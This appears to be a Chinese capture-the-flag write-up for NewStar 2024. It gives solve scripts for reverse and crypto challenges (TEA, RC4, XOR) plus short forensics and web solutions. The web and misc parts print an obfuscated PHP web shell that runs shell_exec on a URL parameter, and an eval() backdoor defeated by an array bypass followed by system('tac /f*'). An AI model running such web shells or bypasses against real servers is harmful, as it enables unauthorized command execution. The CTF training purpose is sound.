<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>p <span style="color:#f92672">=</span> <span style="color:#ae81ff">446302455051275584229157195942211</span>
</span></span><span style="display:flex;"><span>v0 <span style="color:#f92672">=</span> <span style="color:#ae81ff">190997821330413928409069858571234</span>
</span></span><span style="display:flex;"><span>v1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">137340509740671759939138452113480</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>derta <span style="color:#f92672">=</span> <span style="color:#ae81ff">462861781278454071588539315363</span>
</span></span><span style="display:flex;"><span>v3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">489552116384728571199414424951</span>
</span></span><span style="display:flex;"><span>v4 <span style="color:#f92672">=</span> <span style="color:#ae81ff">469728069391226765421086670817</span>
</span></span><span style="display:flex;"><span>v5 <span style="color:#f92672">=</span> <span style="color:#ae81ff">564098252372959621721124077407</span>
</span></span><span style="display:flex;"><span>v6 <span style="color:#f92672">=</span> <span style="color:#ae81ff">335640247620454039831329381071</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v2 <span style="color:#f92672">=</span> (derta <span style="color:#f92672">*</span> <span style="color:#ae81ff">32</span>) <span style="color:#f92672">%</span> p
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 反向32次迭代的加密过程</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">32</span>):
</span></span><span style="display:flex;"><span>    v2 <span style="color:#f92672">=</span> (v2 <span style="color:#f92672">-</span> derta) <span style="color:#f92672">%</span> p
</span></span><span style="display:flex;"><span>    v0 <span style="color:#f92672">=</span> (v0 <span style="color:#f92672">-</span> ((v1 <span style="color:#f92672">+</span> v2) <span style="color:#f92672">^</span> (<span style="color:#ae81ff">8</span> <span style="color:#f92672">*</span> v1 <span style="color:#f92672">+</span> v5) <span style="color:#f92672">^</span> ((v1 <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">7</span>) <span style="color:#f92672">+</span> v6))) <span style="color:#f92672">%</span> p
</span></span><span style="display:flex;"><span>    v1 <span style="color:#f92672">=</span> (v1 <span style="color:#f92672">-</span> ((v0 <span style="color:#f92672">+</span> v2) <span style="color:#f92672">^</span> (<span style="color:#ae81ff">8</span> <span style="color:#f92672">*</span> v0 <span style="color:#f92672">+</span> v3) <span style="color:#f92672">^</span> ((v0 <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">7</span>) <span style="color:#f92672">+</span> v4))) <span style="color:#f92672">%</span> p
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;v0=&#34;</span>, v0)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;v1=&#34;</span>, v1)
</span></span><span style="display:flex;"><span>l <span style="color:#f92672">=</span> <span style="color:#ae81ff">199</span>
</span></span><span style="display:flex;"><span>shift <span style="color:#f92672">=</span> l <span style="color:#f92672">//</span> <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>combined <span style="color:#f92672">=</span> (v0 <span style="color:#f92672">&lt;&lt;</span> shift) <span style="color:#f92672">+</span> v1
</span></span><span style="display:flex;"><span>a <span style="color:#f92672">=</span> hex(combined)[<span style="color:#ae81ff">2</span>:]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> len(a) <span style="color:#f92672">%</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>    a <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;0&#34;</span> <span style="color:#f92672">+</span> a
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join([chr(int(a[i:i<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>], <span style="color:#ae81ff">16</span>)) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(a), <span style="color:#ae81ff">2</span>)])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Recovered flag:&#34;</span>, flag)
</span></span></code></pre></div><h2 id="misc-1">Misc<a hidden class="anchor" aria-hidden="true" href="#misc-1">#</a></h2>
<h3 id="wireshark_checkin">wireshark_checkin<a hidden class="anchor" aria-hidden="true" href="#wireshark_checkin">#</a></h3>
<p>wireshark打开http看一下追踪里面里面有flag</p>
<p><img alt="23" loading="lazy" src="../../images/Newstar/2024/23.png"></p>
<h3 id="wireshark_secret">wireshark_secret<a hidden class="anchor" aria-hidden="true" href="#wireshark_secret">#</a></h3>
<p>导出图片得到flag</p>
<p><img alt="24" loading="lazy" src="../../images/Newstar/2024/24.png"></p>
<h3 id="热心助人的小明同学">热心助人的小明同学<a hidden class="anchor" aria-hidden="true" href="#热心助人的小明同学">#</a></h3>
<p>Passware Kit Forensic工具一把梭</p>
<p><img alt="25" loading="lazy" src="../../images/Newstar/2024/25.png"></p>
<h3 id="用溯流仪见证伏特台风">用溯流仪见证伏特台风<a hidden class="anchor" aria-hidden="true" href="#用溯流仪见证伏特台风">#</a></h3>
<p><a href="https://news.sina.com.cn/zx/gj/2024-07-08/doc-inccmcxn1550323.shtml#:~:text=4%E6%9C%8815%E6%97%A5%EF%BC%8C%E4%B8%AD%E5%9B%BD?qq-pf-to=pcqq.group">查找到网站</a>，定位到domain，进行16位小写md5得到flag</p>
<h3 id="你也玩原神吗">你也玩原神吗<a hidden class="anchor" aria-hidden="true" href="#你也玩原神吗">#</a></h3>
<p>gif提取内容</p>
<p><img alt="36" loading="lazy" src="../../images/Newstar/2024/36.jpeg"></p>
<p>原神真好玩😋，我直接手调</p>
<p><img alt="26" loading="lazy" src="../../images/Newstar/2024/26.jpg"></p>
<p>右下角的内容就行栅栏解密</p>
<p><img alt="27" loading="lazy" src="../../images/Newstar/2024/27.png"></p>
<h3 id="字里行间的秘密">字里行间的秘密<a hidden class="anchor" aria-hidden="true" href="#字里行间的秘密">#</a></h3>
<p>txt打开看下面的字符，零宽度隐写</p>
<p><img alt="28" loading="lazy" src="../../images/Newstar/2024/28.png"></p>
<p>带入解密，复制粘贴到txt里面即可得到flag</p>
<h3 id="hertas-study">Herta&rsquo;s Study<a hidden class="anchor" aria-hidden="true" href="#hertas-study">#</a></h3>
<p>加密逻辑</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    $payload<span style="color:#f92672">=</span>$_GET[<span style="color:#e6db74">&#39;payload&#39;</span>];
</span></span><span style="display:flex;"><span>    $payload<span style="color:#f92672">=</span><span style="color:#a6e22e">shell_exec</span>($payload);
</span></span><span style="display:flex;"><span>    $bbb<span style="color:#f92672">=</span><span style="color:#a6e22e">create_function</span>(
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">base64_decode</span>(<span style="color:#e6db74">&#39;J&#39;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">str_rot13</span>(<span style="color:#e6db74">&#39;T&#39;</span>)<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;5z&#39;</span>),   
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">base64_decode</span>(<span style="color:#e6db74">&#39;JG5zPWJhc2U2NF9lbmNvZGUoJG5zKTsNCmZvcigkaT0wOyRpPHN0cmxlbigkbnMpOyRp
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        Kz0xKXsNCiAgICBpZigkaSUy&#39;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">str_rot13</span>(<span style="color:#e6db74">&#39;CG0kXKfAPvNtVPNtVPNtWT5mJlEcKG1m&#39;</span>)<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;dHJfcm90MTMoJG5zWyRpXSk7DQo
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        gICAgfQ0KfQ0KcmV0dXJuICRuczs==&#39;</span>)   
</span></span><span style="display:flex;"><span>    );  
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> $bbb($payload);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>简单分析一下流量，中间传了一次假的flag后面传了一次真的，明显的==，上exp</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">reverseEncryption</span>($ns) {
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> ($i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; $i <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">strlen</span>($ns); $i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ($i <span style="color:#f92672">%</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>$ns[$i] <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_rot13</span>($ns[$i]);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> <span style="color:#a6e22e">base64_decode</span>($ns);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>$encryptedString <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;ZzxuZ3tmSQNsaGRsUmBsNzVOdKQkZaVZLa0tCt==&#39;</span>; 
</span></span><span style="display:flex;"><span>$decryptedString <span style="color:#f92672">=</span> <span style="color:#a6e22e">reverseEncryption</span>($encryptedString);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> $decryptedString;
</span></span></code></pre></div><h2 id="re-1">Re<a hidden class="anchor" aria-hidden="true" href="#re-1">#</a></h2>
<h3 id="upx">UPX<a hidden class="anchor" aria-hidden="true" href="#upx">#</a></h3>
<p>测试了一下，下载最新的upx脱壳，版本老的不行，简单的脱壳后发现是rc4,写解密脚本</p>
<p><img alt="29" loading="lazy" src="../../images/Newstar/2024/29.png"></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">init_sbox</span>(key):
</span></span><span style="display:flex;"><span>    sbox <span style="color:#f92672">=</span> list(range(<span style="color:#ae81ff">256</span>))
</span></span><span style="display:flex;"><span>    j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    key_length <span style="color:#f92672">=</span> len(key)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">256</span>):
</span></span><span style="display:flex;"><span>        j <span style="color:#f92672">=</span> (j <span style="color:#f92672">+</span> sbox[i] <span style="color:#f92672">+</span> key[i <span style="color:#f92672">%</span> key_length]) <span style="color:#f92672">%</span> <span style="color:#ae81ff">256</span>
</span></span><span style="display:flex;"><span>        sbox[i], sbox[j] <span style="color:#f92672">=</span> sbox[j], sbox[i] 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> sbox
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">rc4</span>(key, data):
</span></span><span style="display:flex;"><span>    sbox <span style="color:#f92672">=</span> init_sbox(key)
</span></span><span style="display:flex;"><span>    i <span style="color:#f92672">=</span> j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    output <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> byte <span style="color:#f92672">in</span> data:
</span></span><span style="display:flex;"><span>        i <span style="color:#f92672">=</span> (i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">256</span>
</span></span><span style="display:flex;"><span>        j <span style="color:#f92672">=</span> (j <span style="color:#f92672">+</span> sbox[i]) <span style="color:#f92672">%</span> <span style="color:#ae81ff">256</span>
</span></span><span style="display:flex;"><span>        sbox[i], sbox[j] <span style="color:#f92672">=</span> sbox[j], sbox[i]  <span style="color:#75715e"># swap</span>
</span></span><span style="display:flex;"><span>        output<span style="color:#f92672">.</span>append(byte <span style="color:#f92672">^</span> sbox[(sbox[i] <span style="color:#f92672">+</span> sbox[j]) <span style="color:#f92672">%</span> <span style="color:#ae81ff">256</span>])  <span style="color:#75715e"># xor</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> bytes(output)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 定义 data（转换为无符号字节）</span>
</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> [
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">196</span>, <span style="color:#ae81ff">96</span>, <span style="color:#ae81ff">175</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">227</span>, <span style="color:#ae81ff">255</span>, <span style="color:#ae81ff">46</span>, <span style="color:#ae81ff">155</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">245</span>, <span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">86</span>, <span style="color:#ae81ff">81</span>, <span style="color:#ae81ff">110</span>, <span style="color:#ae81ff">238</span>, <span style="color:#ae81ff">95</span>, <span style="color:#ae81ff">125</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">125</span>, <span style="color:#ae81ff">110</span>, <span style="color:#ae81ff">43</span>, <span style="color:#ae81ff">156</span>, <span style="color:#ae81ff">117</span>, <span style="color:#ae81ff">181</span>
</span></span><span style="display:flex;"><span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>key <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;NewStar&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>decrypted_flag <span style="color:#f92672">=</span> rc4(key, data)
</span></span><span style="display:flex;"><span>print(decrypted_flag<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>, errors<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;ignore&#39;</span>))
</span></span></code></pre></div><h3 id="drink_tea">drink_TEA<a hidden class="anchor" aria-hidden="true" href="#drink_tea">#</a></h3>
<p>先看加密逻辑</p>
<img src="../../images/Newstar/2024/34.png" alt="34" style="zoom:67%;" />
<p><img alt="35" loading="lazy" src="../../images/Newstar/2024/35.png"></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdint.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">decrypt</span>(<span style="color:#66d9ef">uint32_t</span><span style="color:#f92672">*</span> v, <span style="color:#66d9ef">uint32_t</span><span style="color:#f92672">*</span> k) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint32_t</span> v0 <span style="color:#f92672">=</span> v[<span style="color:#ae81ff">0</span>], v1 <span style="color:#f92672">=</span> v[<span style="color:#ae81ff">1</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint32_t</span> sum <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xC6EF3720</span>;  <span style="color:#75715e">// 0x9E3779B9 * 32
</span></span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint32_t</span> delta <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x9E3779B9</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">32</span>; i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>        v1 <span style="color:#f92672">-=</span> ((v0 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">+</span> k[<span style="color:#ae81ff">2</span>]) <span style="color:#f92672">^</span> (v0 <span style="color:#f92672">+</span> sum) <span style="color:#f92672">^</span> ((v0 <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">5</span>) <span style="color:#f92672">+</span> k[<span style="color:#ae81ff">3</span>]);
</span></span><span style="display:flex;"><span>        v0 <span style="color:#f92672">-=</span> ((v1 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">+</span> k[<span style="color:#ae81ff">0</span>]) <span style="color:#f92672">^</span> (v1 <span style="color:#f92672">+</span> sum) <span style="color:#f92672">^</span> ((v1 <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">5</span>) <span style="color:#f92672">+</span> k[<span style="color:#ae81ff">1</span>]);
</span></span><span style="display:flex;"><span>        sum <span style="color:#f92672">-=</span> delta;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    v[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> v0;
</span></span><span style="display:flex;"><span>    v[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> v1;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> key[] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;WelcomeToNewStar&#34;</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint8_t</span> enc[] <span style="color:#f92672">=</span> { <span style="color:#ae81ff">120</span>, <span style="color:#ae81ff">32</span>, <span style="color:#ae81ff">247</span>, <span style="color:#ae81ff">179</span>, <span style="color:#ae81ff">197</span>, <span style="color:#ae81ff">66</span>, <span style="color:#ae81ff">206</span>, <span style="color:#ae81ff">218</span>, 
</span></span><span style="display:flex;"><span>                      <span style="color:#ae81ff">133</span>, <span style="color:#ae81ff">89</span>, <span style="color:#ae81ff">33</span>, <span style="color:#ae81ff">26</span>, <span style="color:#ae81ff">38</span>, <span style="color:#ae81ff">86</span>, <span style="color:#ae81ff">90</span>, <span style="color:#ae81ff">89</span>, 
</span></span><span style="display:flex;"><span>                      <span style="color:#ae81ff">41</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">237</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">168</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">238</span>, 
</span></span><span style="display:flex;"><span>                      <span style="color:#ae81ff">54</span>, <span style="color:#ae81ff">89</span>, <span style="color:#ae81ff">17</span>, <span style="color:#ae81ff">135</span>, <span style="color:#ae81ff">253</span>, <span style="color:#ae81ff">92</span>, <span style="color:#ae81ff">35</span>, <span style="color:#ae81ff">36</span> };
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 将密钥转换为 uint32 列表
</span></span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint32_t</span> k[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memcpy</span>(k, key, <span style="color:#66d9ef">sizeof</span>(k));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 每8字节（两个 uint32）进行解密
</span></span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#66d9ef">sizeof</span>(enc); i <span style="color:#f92672">+=</span> <span style="color:#ae81ff">8</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">uint32_t</span> v[<span style="color:#ae81ff">2</span>];
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">memcpy</span>(v, enc <span style="color:#f92672">+</span> i, <span style="color:#66d9ef">sizeof</span>(v));
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">decrypt</span>(v, k);
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 检查解密后的值
</span></span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Decrypted values: %u %u</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, v[<span style="color:#ae81ff">0</span>], v[<span style="color:#ae81ff">1</span>]);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 更新加密数组
</span></span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">memcpy</span>(enc <span style="color:#f92672">+</span> i, v, <span style="color:#66d9ef">sizeof</span>(v));
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 输出解密后的结果
</span></span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#66d9ef">sizeof</span>(enc); i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (enc[i] <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">32</span> <span style="color:#f92672">&amp;&amp;</span> enc[i] <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">127</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">putchar</span>(enc[i]);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">putchar</span>(<span style="color:#e6db74">&#39;\n&#39;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h3 id="dirty_flowers">Dirty_flowers<a hidden class="anchor" aria-hidden="true" href="#dirty_flowers">#</a></h3>
<pre tabindex="0"><code>def decrypt(v3, key):
    decrypted = []
    key_length = len(key)
    for i in range(len(v3)):
        decrypted_char = v3[i] ^ ord(key[i % key_length])
        decrypted.append(decrypted_char)
    return decrypted
v3 = [
    2, 5, 19, 19, 2, 30, 83, 31, 92, 26,
    39, 67, 29, 54, 67, 7, 38, 45, 85, 13,
    3, 27, 28, 45, 2, 28, 28, 48, 56, 50,
    85, 2, 27, 22, 84, 15
]
key = &#34;dirty_flower&#34;
decrypted_values = decrypt(v3, key)
flag = &#39;&#39;.join(chr(num) for num in decrypted_values)
print(flag)
</code></pre><h2 id="web-1">Web<a hidden class="anchor" aria-hidden="true" href="#web-1">#</a></h2>
<h3 id="你能在一秒内打出八句英文吗">你能在一秒内打出八句英文吗<a hidden class="anchor" aria-hidden="true" href="#你能在一秒内打出八句英文吗">#</a></h3>
<p>简单分析一下前端后写个py发包就行了</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> bs4 <span style="color:#f92672">import</span> BeautifulSoup
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>session <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>Session()
</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://eci-2zeefa47o1td1sssj8ml.cloudeci1.ichunqiu.com/start&#39;</span>
</span></span><span style="display:flex;"><span>res <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>get(url)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>soup <span style="color:#f92672">=</span> BeautifulSoup(res<span style="color:#f92672">.</span>text, <span style="color:#e6db74">&#39;html.parser&#39;</span>)
</span></span><span style="display:flex;"><span>text <span style="color:#f92672">=</span> soup<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#39;p&#39;</span>, id<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;text&#39;</span>)<span style="color:#f92672">.</span>get_text()
</span></span><span style="display:flex;"><span>user_input <span style="color:#f92672">=</span> text
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>post_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://eci-2zeefa47o1td1sssj8ml.cloudeci1.ichunqiu.com/submit&#39;</span>
</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;user_input&#39;</span>: user_input} 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 发送 POST 请求</span>
</span></span><span style="display:flex;"><span>response <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>post(post_url, data<span style="color:#f92672">=</span>data)
</span></span><span style="display:flex;"><span>print(response<span style="color:#f92672">.</span>text)
</span></span></code></pre></div><h3 id="遗失的拉链">遗失的拉链<a hidden class="anchor" aria-hidden="true" href="#遗失的拉链">#</a></h3>
<p>根据题目的提示应该是www.zip下载看一下pizwww.php</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span><span style="color:#75715e">//for fun
</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;new&#39;</span>])<span style="color:#f92672">&amp;&amp;</span><span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;star&#39;</span>])){
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">sha1</span>($_GET[<span style="color:#e6db74">&#39;new&#39;</span>])<span style="color:#f92672">===</span><span style="color:#a6e22e">md5</span>($_POST[<span style="color:#e6db74">&#39;star&#39;</span>])<span style="color:#f92672">&amp;&amp;</span>$_GET[<span style="color:#e6db74">&#39;new&#39;</span>]<span style="color:#f92672">!==</span>$_POST[<span style="color:#e6db74">&#39;star&#39;</span>]){
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">//欸 为啥sha1和md5相等呢
</span></span></span><span style="display:flex;"><span>        $cmd <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;cmd&#39;</span>];
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/cat|flag/i&#34;</span>, $cmd)) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;u can not do this &#34;</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#66d9ef">eval</span>($cmd);
</span></span><span style="display:flex;"><span>    }<span style="color:#66d9ef">else</span>{
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Wrong&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    } 
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>用数组绕过就行了</p>
<p>然后执行system(&rsquo;tac /f*&rsquo;)就可以了</p>
<h3 id="谢谢皮蛋-plus">谢谢皮蛋 plus<a hidden class="anchor" aria-hidden="true" href="#谢谢皮蛋-plus">#</a></h3>
<p>过滤了空格，是字符绕过</p>
